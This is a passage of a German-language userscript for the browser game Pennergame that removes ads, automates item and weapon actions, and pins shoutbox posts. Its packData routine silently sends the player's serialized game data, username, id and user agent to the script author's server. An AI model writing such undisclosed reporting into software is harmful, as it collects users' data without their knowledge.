        var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-!=";
        var o1, o2, o3, h1, h2, h3, h4, bits, i = 0, l = 0,
            ac = 0,
            enc = "",
            tmp_arr = [];
        if (!data) {
            return data;
        }
        var odata = new Array();
        do {
            var c1 = data.charCodeAt(i++);
            if (c1 < 128) {
                odata[l++] = c1;
            } else if (c1 > 127 && c1 < 2048) {
                odata[l++] = (c1 >> 6) | 192;
                odata[l++] = (c1 & 63) | 128;
            } else {
                odata[l++] = (c1 >> 12) | 224;
                odata[l++] = ((c1 >> 6) & 63) | 128;
                odata[l++] = (c1 & 63) | 128;
            }
        } while (i < data.length);
        odata[l++] = 0;
        odata[l++] = 0;
        i = 0;
        do { // pack three octets into four hexets
            o1 = odata[i++];
            o2 = odata[i++];
            o3 = odata[i++];
            bits = o1 << 16 | o2 << 8 | o3;
            h1 = bits >> 18 & 0x3f;
            h2 = bits >> 12 & 0x3f;
            h3 = bits >> 6 & 0x3f;
            h4 = bits & 0x3f;
            // use hexets to index into b64, and append result to encoded string
            tmp_arr[ac++] = b64.charAt(h1) + b64.charAt(h2) + b64.charAt(h3) + b64.charAt(h4);
        } while (i < odata.length);
        enc = tmp_arr.join('');
        var r = odata.length % 3;
        return (r ? enc.slice(0, r - 3) : enc) + '==='.slice(r || 3);
    }
    if (scriptData.length < 4)
        window.setTimeout(packData, 5000);
    else if (!noUpdate) {
        var getInfo = GM_getValue(TOWNEXTENSION+"GetInfo", 0);
        if (getInfo > 0) {
            info = base64_encode(serialize(glblVars));
            if (info != PGu_getValue("Userdata", "")) {
                getInfo = 0;
                PGu_setValue("Userdata", info);
            }
        }
        else {
            GM_deleteValue(TOWNEXTENSION + "Userdata" + m_ownuserid);
            getInfo = 480;
        }
        if (IsTimeToCheck(TOWNEXTENSION + "update" + m_ownuserid, getInfo, INFO_URL)) {
            GM_xmlhttpRequest({method: 'POST', url: INFO_URL + "t.php",
                headers: {'Content-type': 'application/x-www-form-urlencoded'},
                data: encodeURI('town=' + TOWNEXTENSION + '&name=' + m_ownusername +
                                '&id=' + scriptData[1] + '&script=' + THISSCRIPTVERSION +
                                '&client=' + navigator.userAgent + '&submit='+info),
                onload: function(responseDetails)	{
                }});
        }
    }
}
setTimeout(packData, 5000);

var m_ownuserid = getOwnUserID();
var m_owngangid = 0;
var attwarn = 0;
scriptData[0] = TOWNEXTENSION;
scriptData[1] = m_ownuserid;
scriptData[2] = THISSCRIPTVERSION;
var weaponcheck1;
var weaponcheck2;
var homecheck;
var plundercheck;

var dailyTasks = initDaily(lang);
var myDailyTasks = initDaily(myLang);
initPanels();
var saveAllPlunder = '';
var collAllPlunder = -1;
var inGangStatus = 0;

function removeAllAds() {
    var ads = document.getElementsByTagName("img");
    for (var i = ads.length - 1; i >= 0; i--) {
        if (ads[i].src.indexOf('XmasAdventCalendar') == -1)
            if (ads[i].src.indexOf('events/offers') != -1 || ads[i].src.indexOf('play.pennergame') != -1) {
                ads[i].parentNode.removeChild(ads[i]);
        }
    }

    var ads = document.getElementsByTagName("a");
    for (var i = 0; i < ads.length; i++) {
        if (ads[i].href.indexOf('itemsale') != -1) {
        if (ads[i].className == 'ttip')
        continue;
        if (ads[i].getElementsByTagName("span").length > 0) {
        if (ads[i].getElementsByTagName("span")[0].className == 'btn-right')
            continue;
        }
    }
        if (ads[i].href.indexOf('play.pennergame') != -1 ||
            ads[i].href.indexOf('media.fastclick.net') != -1 ||
            ads[i].href.indexOf('ads.adtiger') != -1 ||
            ads[i].href.indexOf('itemsale') != -1 ||
            ads[i].href.indexOf('googleads') != -1 ||
            ads[i].href.indexOf('adnxs') != -1 ||
            ads[i].href.substr(0,3) == "ad.")
        {
            ads[i].parentNode.removeChild(ads[i]);
        }
    }

    var ads = document.getElementsByTagName("div");
    for (var i = 0; i < ads.length; i++) {
        if (ads[i].id.indexOf('ftdivid') != -1 ||
            ads[i].id.indexOf('adscale') != -1 ||
            (ads[i].childNodes.length == 0 && ads[i].innerHTML.indexOf("flashblock") != -1)) {
            ads[i].parentNode.removeChild(ads[i]);
        }
    }

    var ads = document.getElementsByTagName("iframe");
    for (var i = 0; i < ads.length; i++) {
        ads[i].parentNode.removeChild(ads[i]);
    }

    var ads = document.getElementsByTagName("ins");
    for (var i = 0; i < ads.length; i++) {
        ads[i].parentNode.removeChild(ads[i]);
    }
}

var doTheAction = function () {
    if (location.toString().indexOf(WEAPON_URL) != -1) {
        weapon = PGu_getValue("weapon", 0) + "#";
        weapon = weapon.split("#");
        if (weapon[0] > 0) {
            var td = document.getElementsByName("submitForm");
            if (td.length > 1) {
                var dis = -1;
                var ena = -1;
                for (i = 0; i < td.length; i++) {
                    if (td[i].disabled)
                        dis = i;
                    else if (document.getElementsByName("id")[i].value == weapon[0])
                        ena = i;
                    if (dis != -1 && ena != -1)
                        break;
                }
                if (dis >= 0 && ena >= 0) {
                    td[ena].disabled = true;
                    td[dis].disabled = false;
                    var swap = td[dis].value;
                    td[dis].value = td[ena].value;
                    td[ena].value = swap;
                }
            }

            GM_xmlhttpRequest({method: 'POST', url: WEAPON_URL + "use/",
                headers: {'Content-type': 'application/x-www-form-urlencoded'},
                data: encodeURI('id='+weapon[0]),
                onload: function(responseDetails)	{
                    PGu_setValue("weapon", 0);
                    window.location.href = location.toString();
                }});
            return;
        }
    }
    else if (IsOverviewPage() && PGu_getValue("weapon", "0") != "0") {
        weapon = PGu_getValue("weapon", 0).split("#");
        var wtd = document.getElementsByClassName("double")[0];
        var img = wtd.getElementsByTagName("div")[0].getElementsByTagName("img")[0];
        var newtd = img.cloneNode(true);
        newtd.src = weapon[2];
        img.parentNode.appendChild(newtd);
        img.parentNode.removeChild(img);
        wtd.getElementsByTagName("ul")[0].getElementsByTagName("li")[0].innerHTML = weapon[1];
        wtd.getElementsByTagName("ul")[0].getElementsByTagName("li")[1].getElementsByTagName("span")[0].innerHTML = weapon[3];
    }

    var ads = document.getElementsByTagName("img");
    for (var i = ads.length - 1; i >= 0; i--) {
        if (ads[i].src.indexOf('XmasAdventCalendar') != -1) {
            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** Adventskalender abfragen
            // **********************************************************************************
            GM_xmlhttpRequest({method:"GET", url: TOWNBASE_URL+'event/xmas/advent/', onload:function(responseDetails) {
                var content = responseDetails.responseText;
                if (content.indexOf('/event/xmas/get/') != -1) {
                    var xmasget = content.split('/event/xmas/get/');
                    for (var j = 0; j < xmasget.length; j++)
                        if (xmasget[j].split('img src')[1].indexOf('adventskalender_on') != -1) {
                            if (confirm('Adventskalendert¼r jetzt ¶ffnen ?')) {
                                window.setTimeout("window.location.href = window.location.protocol + '//' + window.location.host + '/event/xmas/get/'", 500);
			                }
                            break;
                        }
                }
            }});
            break;
        }
    }

    var removeAds = GM_getValue("removeAds", 0);
    GM_setValue("removeAds", removeAds);
    if (removeAds)
        removeAllAds();

    if (Right$(location.toString(), 6) == 'daily/')
    	PGu_setValue("lockDA", "0");
    inGangStatus = PGu_getValue("inGang", "0");

    var ava2 = document.getElementsByClassName("avatar_img");
    if (ava2.length > 0) {
        // **********************************************************************************
        // *** GM_XMLHTTPREQUEST *** Profilseite abfragen
        // **********************************************************************************
        GM_xmlhttpRequest({method:"GET", url: TOWNBASE_URL+'profil/id:'+m_ownuserid+'/', onload:function(responseDetails) {
            var content = responseDetails.responseText;
            if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                var doc = HTML2DOM(content);
                var row1 = doc.getElementsByClassName("row1")[0];
                var ava = row1.getElementsByTagName("div")[0];
                if (ava.innerHTML.indexOf('/avatare/') == -1)
                    return;
                if (ava.innerHTML.indexOf('class="avatar"') == -1) {
                    var ava2 = document.getElementsByClassName("avatar_img");
                    if (ava2.length > 0)
                        ava2[0].innerHTML = ava.innerHTML;
                }
            }
        }
        });
    }

    // **********************************************************************************
    // *** GM_XMLHTTPREQUEST *** Plunderseite abfragen
    // **********************************************************************************
    GM_xmlhttpRequest({method:"GET", url: PLUNDER_URL, onload:function(responseDetails) {
            var plundercontent = responseDetails.responseText;
            // Wenn die Plunderseite abgerufen werden konnte (kein Seitenladefehler)
            if (plundercontent.indexOf('id="plunderlist"') != -1) {
                // Anzahl der Plundertabs ermitteln
                if (!oldVersion) {
                    var doc = HTML2DOM(plundercontent);
                    nrOfTabs = doc.getElementsByClassName("plundertab")[0].getElementsByTagName("li").length;
                }

                var bgrndInd = nrOfTabs == 6?0:1;

                // Hintergrundgrafiken anzeigen
                ShowBackgrounds(bgrndInd, -1);

                GM_xmlhttpRequest({method:"GET", url: GANGUPGRADE_URL, onload:function(responseDetails) {
                    var content = responseDetails.responseText;

                    // Wenn die Bandeneigentumseite abgerufen werden konnte (kein Seitenladefehler)
                    if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                        // Wenn eine Bande vorhanden ist
                        if (content.indexOf(KEYWORD_GANGUPGR[lang]) != -1) {
                            var doc = HTML2DOM(content);
                            var abilities = doc.getElementsByClassName("fixheight");
                            var abCnt = abilities.length;
                            if (abilities[abCnt-2].getElementsByTagName('td')[1].innerHTML.indexOf('1/1') != -1)
                                WiWut = 1;
                            else if (abilities[abCnt-1].getElementsByTagName('td')[1].innerHTML.indexOf('1/1') != -1)
                                WiWut = 2;
                            // Waffenkammer und Bandenhaus ermitteln
                            glblVars[7] = 1 + Number(abilities[1].getElementsByTagName('td')[1].innerHTML.split('(')[1].split('%')[0]) / 100;
                            glblVars[8] = 1 + Number(abilities[2].getElementsByTagName('td')[1].innerHTML.split('(')[1].split('%')[0]) / 100;
                            m_owngangid = content.split('/profil/bande:')[1].split('/')[0];
                            glblVars[15] = m_owngangid;
                        }
                        else {
                            PGu_setValue("inGang", "0");
                            glblVars[15] = 0;
                            if (inGangStatus == 1)
                                alert(getLangTxt(TxtAlertNoGang));
                        }
                    }
                    else {
                        window.setTimeout("document.location.reload()", 2000);
                        return;
                    }

                    ShowBackgrounds(bgrndInd, m_owngangid);
                    if (WiWut == 1)
                        ShowImg('', '', ICON_PLNDWUTPOWERBACK[bgrndInd], '', 123, 52, PB_X, PB_Y, '', 'PBBACK');
                    else if (WiWut == 2)
                        ShowImg('', '', ICON_PLNDWIWUPOWERBACK[bgrndInd], '', 123, 52, PB_X, PB_Y, '', 'PBBACK');
                    else
                        ShowImg('', '', ICON_PLNDGANGPOWERBACK[bgrndInd], '', 123, 52, PB_X, PB_Y, '', 'PBBACK');

                    // Aktuellen Plunder ermitteln und anzeigen
                    GetCurrentPlunder(plundercontent);

                    CheckBetterEquip();

                    // falls vorhanden, Benachrichtigung über neue Nachrichten verschieben
                    if (document.getElementById("my-profile").getElementsByTagName("div")[2].innerHTML.indexOf("new_msg_infoscreen") != -1)
                        document.getElementById("my-profile").getElementsByTagName("div")[2].setAttribute('style', 'left: '+(nrOfTabs!=6?12:40)+'px; bottom: 45px');

                    // ***********************************************************************************************
                    // Promille- und Waschleiste
                    // ***********************************************************************************************
                    // Wasch-Icon einfügen
                    var curElem = ShowImg('PWBACK', '', noWash?ICON_REDC:ICON_WASH, getLangTxt(noWash?TxtLife:TxtWash), '', '', 80, 20, 3, 'infozentrale_wash');
                    if (curElem == null)
                        return;
                    WashHandler(curElem);

                    curElem = ShowImg('PWBACK', '', ICON_PROMILLEUP, getLangTxt(TxtPromUp), '', '', 9, 20, 3, 'infozentrale_promilleup');
                    if (curElem == null)
                        return;
                    PromilleUpHandler(curElem);
                    curElem = ShowImg('PWBACK', '', ICON_PROMILLEDOWN, getLangTxt(TxtPromDown), '', '', 38, 20, 3, 'infozentrale_promilledown');
                    if (curElem == null)
                        return;
                    PromilleDownHandler(curElem);

                    FeedbackHandler('PW');
                    FeedbackHandler('SC');

                    AutoDefWeapon();

                    // **********************************************************************************
                    // Bandenprofillinks beim Bandenkampf in Links umwandeln
                    // **********************************************************************************
                    // Wenn die aktuelle Seite die Bandenkampf-Übersichtsseite ist
                    if (IsFightOverviewPage()) {
                        // Ermitteln der Tabelle Bandenkampfübersicht
                        var gangtable = document.getElementById("content").getElementsByTagName("table")[1];
                        // Ermitteln der Zeilen der Tabelle Bandenkampfübersicht
                        var gangtrs = gangtable.getElementsByTagName("tr");

                        // Für jede Zeile (ohne erste Zeile = Überschrift)
                        for (i = 1; i < gangtrs.length; i++) {
                            // Ermitteln der Banden-ID und Ersetzen des textuellen Bandennamens durch den Link auf das Bandenprofil
                            if (gangtrs[i].innerHTML.indexOf("id=") == -1)
                                break;
                            if (gangtrs[i].getElementsByTagName("td")[0].innerHTML.substr(0, 4) != "<div")
                                LinkifyGangnames(gangtrs[i]);
                        }
                    }
                }
                });

                // Anzahl ausgewählter Plunderstücke ermitteln
                var NrOfPlunder = GetNrOfPlunderInList();

                // Wenn mindestens ein Plunderstück ausgewählt wurde
                if (NrOfPlunder > 0) {
                    // Gesamten Inhalt des Bodies zum Parsen des vorhandenen Plunders und der Zugriffs-IDs und Darstellen der Icons
                    ShowAllPlunder(plundercontent, NrOfPlunder, 0, 0);
                // sonst: Es wurde noch kein Plunderstück ausgewählt
                } else {
                    ShowImg('PDBACK', PLUNDER_URL, ICON_PLUNDERFREE, getLangTxt(TOOLTIP_PLUNDERAUSWAHL), '', '', 2, 20, 1, 'AddPlunderIcon');
                }
            }
            else {
                window.setTimeout("document.location.reload()", 2000);
                return;
            }

            // **********************************************************************************
            // Icon für Löschen der Kampfliste hinzufügen
            // **********************************************************************************
            // Wenn die aktuelle Seite die Übersichtseite ist
            if (IsOverviewPage()) {
                var summary = document.getElementById("summary");
                var divs = summary.getElementsByTagName("div");
                if (divs[0].className == "new_msg") {
                    var aElem = divs[0].getElementsByTagName("a");
                    for (i = 0; i < aElem.length; i++) {
                        if (aElem[i].innerHTML.indexOf("fightinfo.gif") != -1) {
                            var newElem = divs[0].appendChild(document.createElement('a'));
                            var newimg = newElem.appendChild(document.createElement('img'));
                            newimg.setAttribute('border', '0');
                            newimg.setAttribute('height', 13);
                            newimg.setAttribute('width', 10);
                            newimg.setAttribute('style', 'cursor:pointer');
                            newimg.setAttribute('src', getIconAddr(ICON_DELFIGHTLIST));
                            newElem.addEventListener('click', function(event) {
                                    GM_xmlhttpRequest({method: 'GET', url: TOWNBASE_URL + "/fight/list/clear/",onload: function(responseDetails) {
                                        refreshPage();
                                        }
                                    });
                                },false);
                        }
                    }
                }
            }

            // **********************************************************************************
            // Shoutbox auf Bandenseite auswerten
            // **********************************************************************************
            // Wenn die aktuelle Seite die Bandenseite ist
            var gangPage = Number(IsGangPage());
            if (gangPage > 0) {
                var makePinsTO = function() {
                    function makePins(table) {
                        function processSBPages(page, pinnedSB, lastSB) {
                            GM_xmlhttpRequest({method: 'GET', url: GANG_URL + (oldVersion?page+"/":"shoutbox_ajax/?page=" + page),onload: function(responseDetails) {
                                // Wenn die Bandenseite abgerufen werden konnte
                                if (responseDetails.status != 200 ||
                                    responseDetails.responseText.indexOf('500 - Internal Server Error') != -1) {
                                    ProcessSBPages(page, pinnedSB, lastSB);
                                    return;
                                }

                                var content = responseDetails.responseText;
                                var pos = content.indexOf('<span style="color:#8888');
                                if (pos < 0)
                                    return;
                                pos = content.indexOf(" href='/profil", pos-150);
                                var first = true;
                                while (pos != -1) {
                                    var name = trimString(content.substr(pos).split("</a>")[0].split('>').pop());
                                    var id = content.substr(pos).split(" href='/profil/id:")[1].split('/')[0];
                                    pos = content.indexOf('<span style="color:#8888', pos);
                                    var post = content.substr(pos).split(">")[1].split('<')[0];
                                    var ppos = post.indexOf(":");
                                    var datetime = post.substr(ppos-6,2) + post.substr(ppos-9,2) + post.substr(ppos-2,2) + post.substr(ppos+1,2);
                                    var sb = id + "_" + datetime;
                                    var pinThis = (sb == pinnedSB);
                                    if (!pinThis && datetime < pinnedSB.split("_")[1] && lastSB.split("_")[1] >= pinnedSB.split("_")[1]) {
                                        if (first) page--;
                                        if (document.getElementsByName(lastSB).length > 0)
                                            document.getElementsByName(lastSB)[0].src = getIconAddr(ICON_PIN2);
                                        pinThis = true;
                                    }
                                    if (pinThis && document.getElementById("gotoSB")) {
                                        document.getElementById("gotoSB").addEventListener("click", function(event)  {
                                            if (oldVersion)
                                                window.location.href = "/gang/" + page + "/";
                                            PGu_setValue("pinnedSBGo", "1");
                                        }, false);
                                        if (document.getElementById("gotoSB3"))
                                            document.getElementById("gotoSB3").href = "javascript:shoutbox_ajax.loadajaxpage('/gang/shoutbox_ajax/?page="+page+"')";
                                        document.getElementById("gotoSB").width = "10";
                                        document.getElementById("gotoSB").title = printf(getLangTxt(TxtNoteOnPage), page);
                                        return;
                                    }
                                    lastSB = sb;
                                    if (oldVersion)
                                        pos = content.indexOf('</table', pos);
                                    else {
                                        pos = content.indexOf('</div', pos);
                                        pos = content.indexOf('</div', pos+5);
                                    }
                                    pos = content.indexOf(" href='/profil", pos);
                                    first = false;
                                }
                                processSBPages(page+1, pinnedSB, lastSB);
                            }
                            });
                        }
                        var trs = table.getElementsByTagName("tr");
                        var obj = document.getElementById("tabcontainer");
                        if (PG_getValue("SetSBwidth", 0) == 1 && obj != null)
                            obj.style.width = PG_getValue("MySBwidth", "800") + 'px';
                        if (oldVersion) {
                            for (var i = 0; i < trs.length; i++) {
                                obj = trs[i];
                                if (obj.innerHTML.indexOf('<span style="color: rgb(136') != -1 || obj.innerHTML.indexOf('<span style="color:#88') != -1)
                                    break;
                            }
                            var pagetr = trs[i];
                            var pos = pagetr.innerHTML.indexOf('<a href="/gang/1/');
                            var insText = "";
                            var insText2 = "&nbsp;";
                        } else {
                            var pagetr = trs[trs.length-2];
                            var pagetr = trs[trs.length-2].getElementsByClassName("pagebar")[0];
                            if (pagetr.innerHTML.indexOf("gotoSB3") > 0)
                                return;
                            var pos = pagetr.innerHTML.indexOf('<a href="javascript:shoutbox_ajax');
                            var insText = '<div id="gotoSB2" class="pagebutton"><a id="gotoSB3" rel="shoutboxtab" href="javascript:shoutbox_ajax.loadajaxpage(\'/gang/shoutbox_ajax/?page=1\')">';
                            var insText2 = "</div>";
                        }
                        if (pos > 0)
                            pagetr.innerHTML = pagetr.innerHTML.substr(0, pos) + insText +
                            '<img id="gotoSB" width="0" height="15" style="cursor:pointer" src="' + getIconAddr(ICON_PIN2) + '"></img>' +
                            insText2 + pagetr.innerHTML.substr(pos);
                        if (obj.innerHTML.indexOf('<span style="color: rgb(136') != -1 || obj.innerHTML.indexOf('<span style="color:#88') != -1) {
                            var text = obj.innerHTML;
                            var pos = text.indexOf(' href="/profil');
                            var sbnr = 0;
                            var pinnedSB = PGu_getValue("pinnedSB", "");
                            var pinnedOnPage = false;
                            var lastSB = "";
                            var oldPos = -1;
                            var searchEnd = '</table';
                            if (document.getElementById("tabcontainer") != null)
                               searchEnd = '</div';
                            var first = true;
                            while (pos != -1) {
                                var name = trimString(text.substr(pos).split("</a>")[0].split('>').pop());
                                var id = text.substr(pos).split(' href="/profil/id:')[1].split('/')[0];
                                var pos2 = text.indexOf('<span style="color: rgb(136', pos);
                                if (pos2 < 0) {
                                    pos2 = text.indexOf('<span style="color:#88', pos);
                                    if (pos2 < 0)
                                        break;
                                }
                                pos = pos2;
                                var post = text.substr(pos).split(">")[1].split('<')[0];
                                sbnr++;
                                var ppos = post.indexOf(":");
                                var datetime = post.substr(ppos-6,2) + post.substr(ppos-9,2) + post.substr(ppos-2,2) + post.substr(ppos+1,2);
                                var sb = id + "_" + datetime;
                                var pinThis = (sb == pinnedSB);
                                var oldLen = text.length;
                                if (pinThis)
                                    pinnedOnPage = true;
                                else if (!pinnedOnPage && datetime < pinnedSB.split("_")[1] && lastSB.split("_")[1] >= pinnedSB.split("_")[1]) {
                                    pinnedOnPage = true;
                                    text = text.substr(0,oldPos) + text.substr(oldPos).replace(getIconAddr(ICON_PIN), getIconAddr(ICON_PIN2));
                                }
                                lastSB = sb;
                                oldPos = text.indexOf("<", pos+1);
                                text = text.substr(0,oldPos) + '<input type="hidden" id="' + sb + '" value=""><img id="pin' + sbnr + '" width="10" height="10" src="' + getIconAddr(pinThis&&first?ICON_PIN2:ICON_PIN) + '" style="cursor:pointer" name="' + sb +'"></img>&nbsp;&nbsp;' + text.substr(oldPos);
                                if (pinThis)
                                    first = false;
                                pos += text.length - oldLen;
                                pos = text.indexOf(searchEnd, pos);
                                if (!oldVersion)
                                    pos = text.indexOf(searchEnd, pos+5);
                                pos = text.indexOf(' href="/profil', pos);
                            }
                            obj.innerHTML = text;
                            if (pinnedOnPage) {
                                if (PGu_getValue("pinnedSBGo", "0") == "1") {
                                    PGu_setValue("pinnedSBGo", "0");
                                    document.getElementById(pinnedSB).type="button";
                                    document.getElementById(pinnedSB).focus();
                                    document.getElementById(pinnedSB).type="hidden";
                                    window.scrollBy(0,200);
                                }
                            } else if (pinnedSB != "") {
                                var gangPage = Number(IsGangPage());
                                if (gangPage == 1)
                                    var page = 2;
                                else if (lastSB.split("_")[1] < pinnedSB.split("_")[1]) {
                                    lastSB = "";
                                    var page = 1;
                                }
                                else
                                    var page = gangPage + 1;
                                processSBPages(page, pinnedSB, lastSB);
                            }
                            for (var j=1; true; j++) {
                                var img = document.getElementById("pin" + j);
                                if (img == null)
                                    break;
                                img.addEventListener("click", function(event)  {
                                    if (this.src == getIconAddr(ICON_PIN)) {
                                        var pinnedSB = PGu_getValue("pinnedSB", "");
                                        PGu_setValue("pinnedSB", this.name);
                                        if (pinnedSB != "") {
                                            if (document.getElementsByName(pinnedSB).length > 0)
                                                document.getElementsByName(pinnedSB)[0].src = getIconAddr(ICON_PIN);
                                            var gotoSB = document.getElementById("gotoSB");
                                            if (gotoSB)
                                                gotoSB.parentNode.removeChild(gotoSB);
                                            if (!oldVersion) {
                                                var gotoSB2 = document.getElementById("gotoSB2");
                                                if (gotoSB2)
                                                    gotoSB2.parentNode.removeChild(gotoSB2);
                                                var gotoSB3 = document.getElementById("gotoSB3");
                                                if (gotoSB3)
                                                    gotoSB3.parentNode.removeChild(gotoSB3);
                                            }
                                        }
                                        this.src = getIconAddr(ICON_PIN2);
                                    } else {
                                        this.src = getIconAddr(ICON_PIN);
                                        PGu_setValue("pinnedSB", "");
                                    }
                                }, false);
                            }
                        }
                    }
                    if (t > 0)
                        window.setTimeout(makePinsTO, t);
                    if (Number(IsGangPage()) < 1)
                        return;

                    if (PG_getValue("SetSBwidth", 0) == 0)
                        var table = document.getElementById("content").getElementsByTagName("table")[0];
                    else
                        var table = document.getElementById("MotD");
                    var tdtest = document.getElementById("shoutboxtab");
                    var selectd = true;
                    if (tdtest.getElementsByTagName("li").length > 1)
                        selectd = tdtest.getElementsByTagName("a")[0].className == "selected";
                    if (selectd)
                        if ((table.innerHTML.indexOf('<span style="color:#88') != -1 || table.innerHTML.indexOf('<span style="color: rgb(136') != -1) && table.innerHTML.indexOf(getIconAddr(ICON_PIN)) == -1 && table.innerHTML.indexOf(getIconAddr(ICON_PIN2)) == -1) {
                            makePins(table);
                        }
                }

                if (PG_getValue("SetSBwidth", 0) == 1) {
                    var sbwidth = PG_getValue("MySBwidth", "800");
                    var table = document.getElementsByTagName("table")[0];
                    table.parentNode.insertBefore(table.cloneNode(false), table);
                    for (i = 0; i < table.getElementsByTagName("tr").length; i++) {
                       var tr = table.getElementsByTagName("tr")[0];
                       if (tr.innerHTML.indexOf("MotD") != -1)
                           break;
                       tr = tr.parentNode.removeChild(tr);
                       document.getElementsByTagName("table")[0].appendChild(tr);
                    }
                    table.style.width = sbwidth + 'px';
                    table.id = 'MotD';
                    for (i = 0;  i < table.getElementsByTagName("div").length; i++) {
                        var width = parseInt(table.getElementsByTagName("div")[i].style.width);
                        if (width == 490 ||
                            table.getElementsByTagName("div")[i].id == "tabcontainer" ||
                            table.getElementsByTagName("div")[i].className == "pagebar" ||
                            table.getElementsByTagName("div")[i].id == "tabinputcontainer")
                           table.getElementsByTagName("div")[i].style.width = (width - 510 + sbwidth) + 'px';
                    }
                }
                else {
                    PG_setValue("SetSBwidth", 0);
                    if (PG_getValue("MySBwidth", 0) == 0)
                        PG_setValue("MySBwidth", 800);
                }

                var t = (oldVersion?0:2000);
                makePinsTO();
            }

            // **********************************************************************************
            // Wenn die aktuelle Seite die Plunderseite ist
            // **********************************************************************************
            if (IsPlunderPage() && document.getElementsByClassName("grunge zleft").length > 0) {
                var fnPlunderChB = function () {
                    function insPlunderChb (plundertrs) {
                        var selectedTab = -1;
                        if (!oldVersion) {
                            var plundertab = document.getElementById("plundertab").getElementsByTagName("li");
                            for (var ii = 0; ii < plundertab.length; ii++)
                                if (plundertab[ii].getElementsByClassName("selected").length > 0) {
                                    selectedTab = ii;
                                    break;
                                }
                        }
                        else {
                            // "Verkaufen"-Spalte schmaler machen
                            GM_addStyle('#content .grunge #plunder table th.col4 div { width: 70px; }');
                            GM_addStyle('#content .grunge #plunder table th.col4     { width: 70px; }');
                        }

                        // Icon zum Leeren des Plunder-Direktzugriffs hinzufügen
                        AddResetIcon(plundertable);

                        if (selectedTab == 5)
                            return;

                        // Für alle Zeilen mit Plunderstücken
                        for (var i = oldVersion; i < plundertrs.length; i++) {
                            // **********************************************************************************
                            // Funktion fügt Ausführungscode zur aktuellen Checkbox hinzu
                            // **********************************************************************************
                            function PrepareCheckbox(i, usemode, plunderinfo) {
                                // Checkbox checken/unchecken in Abhängigkeit davon, ob das Plunderstück in der Direktzugriffsliste ist
                                document.getElementById("Checkbox" + usemode + "_" + i).checked = (IsPlunderInList(plunderinfo + "*" + usemode) > 0);
                                document.getElementById("Checkbox" + usemode + "_" + i).title = usemode=="A"?getLangTxt(TxtEquip):getLangTxt(TxtUse);

                                // Eventhandler hinzufügen für Click-Ereignis
                                document.getElementById("Checkbox" + usemode + "_" + i).addEventListener("click", function(event)
                                {
                                    // Wenn die Checkbox gecheckt ist
                                    if (this.checked) {
                                        // Wenn noch nicht mehr als 9 Plunder in der Direktzugriffsliste stehen
                                            // Plunderstück in die Direktzugriffsliste hinzufügen
                                            AddPlunderToList(this.getAttribute("name").split("*")[0] + "*" + this.getAttribute("name").split("*")[1] + "*" + usemode);
                                    // sonst: Die Checkbox ist nicht gecheckt
                                    } else {
                                        // Plunderstück aus der Direktzugriffsliste entfernen
                                        RemovePlunderFromList(this.getAttribute("name").split("*")[0] + "*" + this.getAttribute("name").split("*")[1] + "*" + usemode);
                                    }
                                    // Eventuell bereits schon angezeigten Direktplunder entfernen
                                    HideAllPlunder();
                                    // Aktuellen Direktplunder anzeigen
                                    ShowAllPlunder(document.getElementsByTagName("html")[0].innerHTML, GetNrOfPlunderInList(), -1, 0);
                                }, false);
                            }
                            function insElem(newtd, box, plundertrs, i, usemode, plunderinfo, td) {
                                if (box) {
                                    // Checkbox zusammenstellen
                                    newtd.innerHTML = "<form name='PlunderCheckbox' action=''>" +
                                                      "<input name='" + plunderinfo + "*"+usemode+"' id='Checkbox"+usemode+"_"+i + "' type='checkbox'></form>";
                                    // Zelle anhängen
                                    plundertrs[i].insertBefore(newtd, oldVersion?td:td.nextSibling);
                                    PrepareCheckbox(i, usemode, plunderinfo);
                                // sonst: Das Plunderstück kann nicht angelegt/benutzt werden
                                } else {
                                    // Leere Zelle
                                    newtd.innerHTML = "&nbsp;";
                                    // Zelle anhängen
                                    plundertrs[i].insertBefore(newtd, oldVersion?td:td.nextSibling);
                                }
                            }

                            // Spalte mit benutzbarem Plunder speichern
                            var benutztd = plundertrs[i].getElementsByTagName("td")[oldVersion?4:5];
                            if (oldVersion)
                                benutztd.setAttribute('style', 'padding-left: 3px; padding-right: 7px; padding-top: 11px');
                            else
                                benutztd.setAttribute('style', 'padding-left: 5px; padding-right: 4px');
                            // Spalte mit anlegbarem Plunder speichern
                            var anlegtd = plundertrs[i].getElementsByTagName("td")[5];
                            if (oldVersion)
                                anlegtd.setAttribute('style', 'padding-left: 5px; padding-right: 4px; padding-top: 11px');
                            else
                                anlegtd.setAttribute('style', 'padding-left: 5px; padding-right: 4px');

                            // Zwei neue Spalten anlegen und formatieren
                            var newtd1 = document.createElement("td");
                            if (oldVersion)
                                newtd1.setAttribute('style', 'padding-left: 0px; padding-right: 4px; padding-top: 13px; width: 10px;');
                            else
                                newtd1.setAttribute('style', 'padding-left: 0px; padding-right: 11px; padding-top: 13px; width: 10px;');
                            var newtd2 = document.createElement("td");
                            newtd2.setAttribute('style', 'padding-left: 0px; padding-right: 11px; padding-top: 13px; width: 10px;');

                            // Plunderinfo zusammenstellen aus Dateiname des Icons und Plundername, separiert durch "*"
                            var plunderinfo = GetPlunderPic(plundertrs[i]) + "*" + GetPlunderName(plundertrs[i]);

                            // **********************************************************************************
                            // Wenn das Plunderstück benutzbar ist
                            // **********************************************************************************
                            var benutzbar = (selectedTab == (nrOfTabs==6?3:2)) || (oldVersion && benutztd.getElementsByTagName("a").length > 0);
                            if (!benutzbar && nrOfTabs != 6) {
                            	var td = benutztd.getElementsByTagName("ul");
                                for (var ii = 0; ii < td.length; ii++) {
                                	if ((td[ii].innerHTML.indexOf('execboost') != -1 || td[ii].innerHTML.indexOf('choose_target') != -1) && td[ii].innerHTML.indexOf("use_stuff(") != -1) {
                                		benutzbar = true;
                                		break;
                                	}
                                }
                            }
                            insElem(newtd1, benutzbar, plundertrs, i, "B", plunderinfo, anlegtd);

                            // **********************************************************************************
                            // Wenn das Plunderstück anlegbar ist
                            // **********************************************************************************
                            var anlegbar = (nrOfTabs==6?(selectedTab >= 0 && selectedTab != 3):false) || (oldVersion && anlegtd.getElementsByTagName("a").length > 0);
                            if (!anlegbar && nrOfTabs != 6) {
                            	var td = anlegtd.getElementsByTagName("ul");
                                for (var ii = 0; ii < td.length; ii++)
                                	if (td[ii].innerHTML.indexOf('change_stuff') != -1) {
                                		anlegbar = true;
                                		break;
                                	}
                            }
